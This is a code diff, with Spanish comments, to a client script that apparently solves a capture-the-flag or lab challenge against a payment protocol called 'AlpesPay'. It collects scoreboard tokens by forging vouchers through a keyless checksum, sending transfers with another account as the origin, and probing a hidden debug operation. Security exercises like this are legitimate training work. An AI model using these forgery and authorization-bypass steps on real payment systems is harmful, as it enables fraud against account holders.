@@ -165,11 +165,28 @@ class FrameParser:
         return extracted_frames
 
 def scan_token(op: int, payload: bytes):
-    """Detecta tokens de verificacion, que vienen con el prefijo 'TKN:'."""
+    """
+    Detecta tokens de verificacion en la respuesta, en CUALQUIER formato observado:
+      1) con prefijo explicito 'TKN:'
+      2) token ASCII alfanumerico en mayusculas (6+ chars, p.ej. 'AP1MHNXJ')
+         que aparece suelto en el payload (como el que devuelve la transferencia).
+    Devuelve el token detectado (str) o None.
+    """
+    # 1) formato con prefijo explicito
     i = payload.find(b"TKN:")
     if i != -1:
-        tok = payload[i+4:].decode("ascii", "replace").strip()
+        tok = payload[i + 4:].decode("ascii", "replace").strip()
         logger.warning(">>> TOKEN DE VERIFICACION (op 0x%02x): %s", op, tok)
+        return tok
+    # 2) token alfanumerico en mayusculas (7+ chars) con letras Y digitos
+    #    (los tokens observados son tipo 'AP04G47C'/'AP1MHNXJ'; exigir ambos
+    #     descarta palabras del catalogo/extracto como 'EXTRACTO' o 'TRANSF').
+    for m in re.finditer(rb"[A-Z0-9]{7,}", payload):
+        cand = m.group().decode("ascii")
+        if any(c.isalpha() for c in cand) and any(c.isdigit() for c in cand):
+            logger.warning(">>> POSIBLE TOKEN DE VERIFICACION (op 0x%02x): %s", op, cand)
+            return cand
+    return None
     
 # ───────────────────────────────────── Clase del Cliente ──────────────────────────────────
 class AlpesPayClient:
@@ -333,29 +350,85 @@ class AlpesPayClient:
 
 
 def main(url: str, enum: bool = False) -> None:
+    """
+    Ejecuta de corrido todas las operaciones que producen resultado, en orden, y
+    deja en 'sesion_alpespay.log' los tokens que emita el servidor.
+
+    Nota: cuales de estas cuentan como los 7 resultados oficiales lo define el
+    marcador (cada token es la evidencia). Aqui se disparan todas para que el log
+    las recoja; revisa el log y toma los 7 tokens.
+
+    ETICA (alcance): todo se hace con NUESTRA cuenta y NUESTRO token. La prueba de
+    validacion de origen (R7) NO usa credenciales de otro equipo: solo cambia el
+    campo 'origen' a una cuenta que no es la nuestra y observa como responde el
+    servidor (probar el servidor, permitido).
+    """
     client = AlpesPayClient(url)
     try:
+        logger.info("===== R1: ANUNCIO (announce / hello) =====")
         client.announce()
+
+        logger.info("===== R2: INICIO DE SESION (login) =====")
         client.login(USERNAME, PASSWORD)
+
+        logger.info("===== R3: CONSULTA DE SALDO =====")
         client.get_balance()
+
+        logger.info("===== R4: EXTRACTO / HISTORIAL =====")
         client.get_history()
+
+        logger.info("----- descubrimiento: CATALOGO (op 0x07) -----")
         client.get_catalog()
-        
-        # Descomenta la siguiente línea si deseas hacer una transferencia de prueba
-        # client.transfer("@equipo17", 100)
-        
+
+        logger.info("===== R5: VALE REAL (emitir desde servicio AV + abonar) =====")
+        try:
+            resp = client.emitir_vale(client.account)
+            bloque = resp[3:]  # quita 'AV' (2 bytes) + 0x81 (1 byte) -> cuenta+monto+serial+crc
+            client.abonar_vale(bloque)
+        except Exception as e:
+            logger.warning("Vale real fallo: %r", e)
+
+        logger.info("===== R6: VALE FORJADO (checksum sin clave, falsificable) =====")
+        try:
+            serial = os.urandom(4)  # serial propio no emitido por el servidor
+            bloque_forjado = forjar_vale(client.account, 1, serial)  # 1 centavo a NUESTRA cuenta
+            client.abonar_vale(bloque_forjado)
+        except Exception as e:
+            logger.warning("Vale forjado fallo: %r", e)
+
+        logger.info("===== R7a: TRANSFERENCIA (op 0x08 ENVIAR, da token) =====")
+        # Monto minimo (1 centavo) para dejar el resultado verificable sin mover saldo relevante.
+        client.transfer("@equipo17", 1)
+
+        logger.info("===== R7b: VALIDACION DE ORIGEN FRENTE AL TITULAR DEL TOKEN =====")
+        # Primero sondeamos el formato que espera TRANSFERIR (0x05) leyendo su error.
+        logger.info("Sondeo op 0x05 (TRANSFERIR) solo con token, para ver sus argumentos:")
+        client.probe(OP_TRANSFERIR)
+        # Luego: MISMO token nuestro, pero ORIGEN = cuenta que NO es la nuestra.
+        ORIGEN_AJENO = 9999  # un numero de cuenta cualquiera distinto del nuestro (NO son credenciales)
+        logger.info("Probando TRANSFERIR con origen=%d usando NUESTRO token (titular=%s). "
+                    "Se observa si el servidor RECHAZA el origen ajeno.",
+                    ORIGEN_AJENO, client.account)
+        client.transferir(ORIGEN_AJENO, 1)
+        # Sondeo de la operacion dev/debug oculta de ajuste (0x09).
+        logger.info("Sondeo op 0x09 (AJUSTE / dev-debug):")
+        try:
+            client.ajuste()
+        except Exception as e:
+            logger.warning("ajuste fallo: %r", e)
+
         if enum:
+            logger.info("----- enumeracion de operaciones (--enum) -----")
             client.enumerate_ops()
+
+        logger.info("===== FIN. Revisa 'sesion_alpespay.log' y recoge los 7 tokens. =====")
     finally:
         client.close()
 
 
-if __name__ == "__main__":
-    args = sys.argv[1:]
-    enum = "--enum" in args
-    args = [a for a in args if a != "--enum"]
-    url = args[0] if args else URL_DEFAULT
-    main(url, enum=enum)
+# NOTA: el bloque de arranque (if __name__ == "__main__") se movio al FINAL del
+# archivo, despues de _extiende_vales(), para que emitir_vale/abonar_vale/forjar_vale
+# ya esten definidos cuando main() se ejecute.
 
 
 # ════════════════════════════════════════════════════════════════════════════
@@ -407,3 +480,11 @@ def _extiende_vales():
     AlpesPayClient.abonar_vale = abonar_vale
 
 _extiende_vales()
+
+# ───────────────────────────────────── Arranque ──────────────────────────────────
+if __name__ == "__main__":
+    args = sys.argv[1:]
+    enum = "--enum" in args
+    args = [a for a in args if a != "--enum"]
+    url = args[0] if args else URL_DEFAULT
+    main(url, enum=enum)
